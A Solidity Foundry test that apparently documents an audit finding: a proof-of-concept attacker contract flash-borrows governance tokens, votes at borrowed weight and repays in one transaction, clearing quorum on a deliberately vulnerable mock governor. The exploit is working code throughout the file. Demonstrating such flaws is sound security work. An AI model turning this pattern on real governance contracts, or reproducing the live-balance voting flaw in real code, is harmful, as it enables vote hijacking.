// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {MockFlashLender, IFlashBorrower} from "../contracts/mocks/MockFlashLender.sol";
import {VulnX100Governor, IVotesLike} from "../contracts/targets/VulnX100Governor.sol";

/// Attacker that borrows voting tokens, casts a vote at inflated weight, and repays
/// — all within a single flash-loan callback. Simulation only.
contract FlashVoteAttacker is IFlashBorrower {
    MockFlashLender lender;
    MockERC20 token;
    VulnX100Governor gov;
    uint256 targetProposal;

    constructor(MockFlashLender _lender, MockERC20 _token, VulnX100Governor _gov) {
        lender = _lender;
        token = _token;
        gov = _gov;
    }

    function attack(uint256 proposalId, uint256 amount) external {
        targetProposal = proposalId;
        lender.flashLoan(amount);
    }

    function onFlashLoan(address _token, uint256 amount) external {
        // We now transiently hold `amount` governance tokens.
        gov.castVote(targetProposal, true); // weight = live balanceOf == borrowed amount
        MockERC20(_token).transfer(address(lender), amount); // repay in-callback
    }
}

/// PoC — [VULN-2] Flash-loan vote manipulation.
contract FlashLoanVoteTest is Test {
    MockERC20 token;
    MockFlashLender lender;
    VulnX100Governor gov;

    address honestWhale = makeAddr("honestWhale");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new MockERC20("X100", "X100");
        gov = new VulnX100Governor(IVotesLike(address(token)));
        lender = new MockFlashLender(token);

        // Simulated supply: 1,000,000 tokens. Honest whale holds 100k; lender pool holds 500k.
        token.mint(honestWhale, 100_000e18);
        token.mint(address(lender), 500_000e18);
        token.mint(address(0xdead), 400_000e18); // rest of float
    }

    function test_flash_loan_swings_a_vote() public {
        // A benign-looking proposal id=1 (target/data irrelevant for this PoC).
        uint256 id = gov.propose(address(0), 0, "");

        // Attacker holds ZERO tokens of their own.
        assertEq(token.balanceOf(attacker), 0, "attacker is broke");

        FlashVoteAttacker bot = new FlashVoteAttacker(lender, token, gov);

        // EXPLOIT: borrow 500k, vote YES at that weight, repay — one transaction.
        vm.prank(attacker);
        bot.attack(id, 500_000e18);

        (, , uint256 forVotes, , , ) = gov.proposalInfo(id);
        assertEq(forVotes, 500_000e18, "EVIDENCE: 500k YES votes cast with borrowed tokens");

        // Quorum = 20% of 1,000,000 = 200,000. Attacker single-handedly cleared it.
        assertGt(forVotes, (token.totalSupply() * gov.quorumBps()) / 10000, "EVIDENCE: quorum met via flash loan");

        // Attacker ends with zero tokens: capital cost was effectively nil.
        assertEq(token.balanceOf(attacker), 0, "attacker still broke after swinging the vote");
    }
}
